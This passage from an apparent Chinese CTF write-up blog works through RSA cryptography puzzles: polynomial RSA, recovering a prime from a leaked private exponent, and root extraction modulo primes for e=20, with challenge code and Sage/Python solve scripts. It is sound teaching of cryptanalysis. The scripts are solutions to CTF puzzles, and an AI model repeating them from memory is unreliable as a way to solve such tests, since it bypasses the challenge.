class="number">230049708</span>*x^<span class="number">42</span> + <span class="number">539600199</span>*x^<span class="number">41</span> + <span class="number">1711135601</span>*x^<span class="number">40</span> + <span class="number">1659775448</span>*x^<span class="number">39</span> + <span class="number">1716176055</span>*x^<span class="number">38</span> + <span class="number">904363231</span>*x^<span class="number">37</span> + <span class="number">2385749710</span>*x^<span class="number">36</span> + <span class="number">567278351</span>*x^<span class="number">35</span> + <span class="number">404199078</span>*x^<span class="number">34</span> + <span class="number">372670353</span>*x^<span class="number">33</span> + <span class="number">1286079784</span>*x^<span class="number">32</span> + <span class="number">1744355671</span>*x^<span class="number">31</span> + <span class="number">2316856064</span>*x^<span class="number">30</span> + <span class="number">2106475476</span>*x^<span class="number">29</span> + <span class="number">614988454</span>*x^<span class="number">28</span> + <span class="number">2149964943</span>*x^<span class="number">27</span> + <span class="number">1065233185</span>*x^<span class="number">26</span> + <span class="number">188130174</span>*x^<span class="number">25</span> + <span class="number">540415659</span>*x^<span class="number">24</span> + <span class="number">1031409799</span>*x^<span class="number">23</span> + <span class="number">1067085678</span>*x^<span class="number">22</span> + <span class="number">1005161755</span>*x^<span class="number">21</span> + <span class="number">249654085</span>*x^<span class="number">20</span> + <span class="number">1816791634</span>*x^<span class="number">19</span> + <span class="number">1437500292</span>*x^<span class="number">18</span> + <span class="number">448596413</span>*x^<span class="number">17</span> + <span class="number">2397497659</span>*x^<span class="number">16</span> + <span class="number">2353732701</span>*x^<span class="number">15</span> + <span class="number">2068949189</span>*x^<span class="number">14</span> + <span class="number">1826419168</span>*x^<span class="number">13</span> + <span class="number">1265366199</span>*x^<span class="number">12</span> + <span class="number">547031306</span>*x^<span class="number">11</span> + <span class="number">1016962374</span>*x^<span class="number">10</span> + <span class="number">160089486</span>*x^<span class="number">9</span> + <span class="number">2264803979</span>*x^<span class="number">8</span> + <span class="number">1081806194</span>*x^<span class="number">7</span> + <span class="number">824215340</span>*x^<span class="number">6</span> + <span class="number">497731793</span>*x^<span class="number">5</span> + <span class="number">45017166</span>*x^<span class="number">4</span> + <span class="number">317548920</span>*x^<span class="number">3</span> + <span class="number">1391127733</span>*x^<span class="number">2</span> + <span class="number">1752881284</span>*x + <span class="number">1290424106</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>多项式rsa，按道理，给了p应该就好分解了，但它是多项式rsa</p>
<p>看la佬的博客，有几点需要知道</p>
<ol>
<li>一般的数论知识可以完美迁移到群论上， 比如欧拉定理</li>
<li>对于欧拉函数$\varphi$来说，在数论中$\varphi (x)=x-1$（x是素数），但是对于不可约多项式$g(x)$，$\varphi(g(x))=p^n-1$（p为$GF(p)$的模，n为多项式最高项次数）。这里我暂且把$GF(p)$当成$Z_p^*$了</li>
</ol>
<p>看着代码理解吧</p>
<blockquote>
<p>解题代码</p>
</blockquote>
<p>首先构造以p为模的，关于x的多项式，这就相当于rsa中的p了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br></pre></td></tr></table></figure>

<p>然后下面这个我不知道什么意思</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br></pre></td></tr></table></figure>

<p>接下来就是熟悉的rsa步骤，分解pq，通过上面那个求欧拉函数的公式求phi，从而求得d，然后是emmmmm，自己看吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P, Q = N.factor()</span><br><span class="line">P, Q = P[<span class="number">0</span>], Q[<span class="number">0</span>]</span><br><span class="line">phi = (p ** P.degree() - <span class="number">1</span>) * (p ** Q.degree() - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = c ^ d</span><br><span class="line">m = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.<span class="built_in">list</span>()])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<p>另外la佬还赠送了两个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#已知p,n,m^e</span></span><br><span class="line">p=</span><br><span class="line">P = PolynomialRing(Zmod(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">c =</span><br><span class="line"></span><br><span class="line"><span class="comment">#分解N</span></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#求φ，注意求法，</span></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#取多项式系数</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(m.coefficients())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#已知p=2,n,e,c</span></span><br><span class="line">p =</span><br><span class="line">P = PolynomialRing(GF(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line">c = []</span><br><span class="line"></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> cc <span class="keyword">in</span> c:</span><br><span class="line">    cc = P(R.fetch_int(cc))</span><br><span class="line">    m = <span class="built_in">pow</span>(cc,d,n)</span><br><span class="line">    m = R(P(m)).integer_representation()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    ans += <span class="built_in">chr</span>(m)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<p>试过了第一个可以跑，也发现.sage文件真正的用法，之前晓得了在sage里跑python文件，但是有些语法可以在sageshell里面运行，但是放在python文件中却是不行，这个时候可以将拓展名改成sage再在sage里load</p>
<p>当然还有一些py2和py3之间转换的屑</p>
<p>第二个脚本有报错，看不懂</p>
<h2 id="unusuarsa4"><a href="#unusuarsa4" class="headerlink" title="unusuarsa4"></a>unusuarsa4</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(invert(q,p))</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q_1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br></pre></td></tr></table></figure>

<p>两条hint</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708160443773.png" alt="unusualrsa4hint1"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708160508649.png" alt="unusualrsa4hint2"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目很简介，把d告诉我们，但是没告诉n</p>
<p>可以想到d泄露攻击；可惜d泄露是分解n用的</p>
<p>但知道<br>$$<br>q_1\times q\equiv\ 1(mod\ p)<br>$$<br>可恶看着hint还是做不出来。从第一个hint可以将那个式子化简<br>$$<br>q_1\times \varphi \equiv (q_1-1)\ mod\ p<br>$$<br>这一步比较简单，有手就行，接下里有点难想；移位一下上式得到<br>$$<br>q1\times \varphi-q_1+1\equiv 0\ mod\ p<br>$$<br>即，$q_1\times \varphi-q_1+1$是p的倍数</p>
<p>令$k_p=q_1\cdot\varphi-q_1+1$，则对任意的g，$gcd(g,p)=1$，有<br>$$<br>g^\varphi \equiv1\ mod\ p\Rightarrow (g^\varphi\ mod\ k_p) \equiv1\ mod\ p<br>$$<br>这一步是由第二个hint的第二点得来的，因为p是kp的因子</p>
<p>接下来你知道怎么做了了吧</p>
<p>很好，不知道！诶嘿，我也不说，就是玩儿。</p>
<blockquote>
<p>脚本编写</p>
</blockquote>
<p>什么？你说$\varphi$不知道？——我听不见</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q_1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># 枚举phi</span></span><br><span class="line">    t = e * d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t % k == <span class="number">0</span>:</span><br><span class="line">        phi = t // k</span><br><span class="line">        kp = q_1 * phi - q_1 + <span class="number">1</span></span><br><span class="line">        x1 = <span class="built_in">pow</span>(<span class="number">3</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x2 = <span class="built_in">pow</span>(<span class="number">5</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x = gcd(x1, x2)</span><br><span class="line">        <span class="keyword">if</span> x.bit_length() == <span class="number">1024</span>:</span><br><span class="line">            p = x</span><br><span class="line">            q = invert(q_1, p)</span><br><span class="line">            n, phi = p*q, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">assert</span> d == invert(e, phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我看着showwp上大佬写的，我直接用3和5作为那个质数了，理论上应该选任意两个都可以的吧</p>
<h2 id="unusualrsa5"><a href="#unusualrsa5" class="headerlink" title="unusualrsa5"></a>unusualrsa5</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br></pre></td></tr></table></figure>

<p>放了一个hint</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708175122579.png" alt="unusualrsa5hint"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>来了，终于来了</p>
<p>有限域开方，先纪念一下Striving师傅给的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br><span class="line">e= <span class="number">20</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="comment"># 普普通通中国剩余定理</span></span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>之前中国海洋大学那道题是e=64，要分成16*4或者8*8来做</p>
<p>此外，还有几种不可行的思路</p>
<p>老办法rabin，但是20=2*2*5每一个质数都和phi有公因子，巧了</p>
<p>就算最后开到$c^5$，用小指数的脚本也跑不出来</p>
<p>对于5，平方根算法也无能为力</p>
<p>好吧，该来总会来的</p>
<blockquote>
<p>有限域开方</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f.roots()</span><br></pre></td></tr></table></figure>

<p>好，结束！</p>
<p>其实有限域开方和rabin挺像，一个可以开多次，一个只能开二次</p>
<p>以模p下的为例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br></pre></td></tr></table></figure>

<p>求出来的解（可能有多个，因为多项式的解嘛），然后继续开，可能一次开的次数不能太大，不然时间会很慢，然后用中国剩余定理，因为求出来的解都是在模各自模数下的</p>
<p>至于里面什么原理，达斯给碟</p>
<p>la佬yyds，看着la佬的博客长大</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708203043872.png" alt="image-20210708203043872"></p>
<p>看看la佬推荐的两道题目</p>
<h3 id="De1CTF2019-Baby-RSA"><a href="#De1CTF2019-Baby-RSA" class="headerlink" title="De1CTF2019-Baby RSA"></a>De1CTF2019-Baby RSA</h3><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1,e2,p,q1p,q1q,hint,flag</span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:<span class="built_in">pow</span>(m,e,n)==c</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e2+tmp,ee2,n)==ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint=<span class="built_in">int</span>(binascii.hexlify(hint),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span>(q1p*q1q==n)</span><br><span class="line"><span class="keyword">assert</span>(q1p&lt;q1q)</span><br><span class="line"><span class="keyword">assert</span>(c==<span class="built_in">pow</span>(hint,e,n))</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">int</span>(binascii.hexlify(flag),<span class="number">16</span>)</span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(c1==<span class="built_in">pow</span>(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==<span class="built_in">pow</span>(flag,e2,p*q2))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>还是考这一类型的，无非就是多套了几层，想要求flag，就要知道e1，e2，q1p，p，想要求e1和e2，看这一步</p>
